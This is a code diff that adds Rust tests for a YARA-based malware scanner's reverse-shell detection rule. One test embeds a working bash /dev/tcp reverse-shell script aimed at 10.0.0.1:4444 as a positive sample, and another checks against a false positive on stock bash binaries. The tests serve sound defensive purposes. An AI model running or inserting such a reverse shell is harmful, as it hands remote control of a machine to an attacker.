@@ -50,3 +50,41 @@ pub fn compile(custom_rules_dir: Option<&Path>) -> Result<yara_x::Rules> {
     info!(custom_loaded, "YARA rules compiled");
     Ok(compiler.build())
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn matched_rule_names(rules: &yara_x::Rules, content: &[u8]) -> Vec<String> {
+        let mut scanner = yara_x::Scanner::new(rules);
+        let results = scanner.scan(content).expect("scan should not fail on in-memory content");
+        results.matching_rules().map(|r| r.identifier().to_string()).collect()
+    }
+
+    #[test]
+    fn flags_a_genuine_bash_dev_tcp_reverse_shell_script() {
+        let rules = compile(None).unwrap();
+        let script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n";
+        assert!(matched_rule_names(&rules, script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
+    }
+
+    /// Regression test for a real false positive found in live red-team
+    /// testing: a genuine, unmodified `/bin/bash` binary contains the
+    /// bare strings "/dev/tcp/" (its own redirection feature) and
+    /// "exec " somewhere in its compiled strings table, which the
+    /// original, looser version of this rule (`$tcp or $udp) and $exec`
+    /// with no redirection-syntax or size requirement) matched outright -
+    /// quarantining a stock system binary as a "reverse shell". This
+    /// synthesizes the same shape (the two trigger substrings present,
+    /// but never as actual shell redirection syntax, padded past the
+    /// rule's size cutoff) without needing an actual bash binary on the
+    /// test machine.
+    #[test]
+    fn does_not_flag_a_large_binary_that_merely_contains_the_bare_substrings() {
+        let rules = compile(None).unwrap();
+        let mut fake_binary = vec![0x7Fu8, b'E', b'L', b'F'];
+        fake_binary.extend_from_slice(b"...references /dev/tcp/ in its own help text, and separately documents the exec builtin...");
+        fake_binary.resize(70 * 1024, 0xAA);
+        assert!(!matched_rule_names(&rules, &fake_binary).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
+    }
+}
